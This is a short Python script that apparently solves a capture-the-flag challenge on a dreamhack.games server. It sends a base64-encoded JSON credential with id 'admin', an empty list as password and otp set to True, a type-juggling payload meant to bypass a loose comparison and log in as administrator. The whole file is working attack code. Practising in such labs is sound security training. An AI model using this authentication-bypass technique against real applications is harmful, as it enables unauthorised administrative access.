import requests
import json
import base64
from bs4 import BeautifulSoup


def standardize(cred):
    return base64.b64encode(json.dumps(cred).encode()).decode()

if __name__ == "__main__":

    url = "http://host3.dreamhack.games:8958"
    cred = {
        'id': 'admin',
        'pw': [],
        'otp': True,
    }
    req = requests.post(url+'/', {'cred': standardize(cred)})
    print(BeautifulSoup(req.content, 'html.parser').prettify())

    